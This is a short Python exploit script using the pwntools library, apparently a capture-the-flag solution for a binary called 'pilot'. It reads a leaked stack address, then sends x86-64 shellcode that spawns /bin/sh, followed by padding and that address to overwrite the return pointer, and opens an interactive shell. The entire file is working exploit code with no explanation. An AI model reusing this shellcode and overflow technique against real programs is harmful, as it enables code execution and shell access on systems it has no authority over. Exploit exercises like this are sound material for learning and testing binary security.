#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./pilot")
p = process(elf.path)

p.recvuntil(b"Location:")
a_buff = p64(int(p.recv(14).decode(), 16))

payload = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload += b"A" * 0x10 # rest of buffer + rbp
payload += a_buff

p.sendline(payload)
p.interactive()
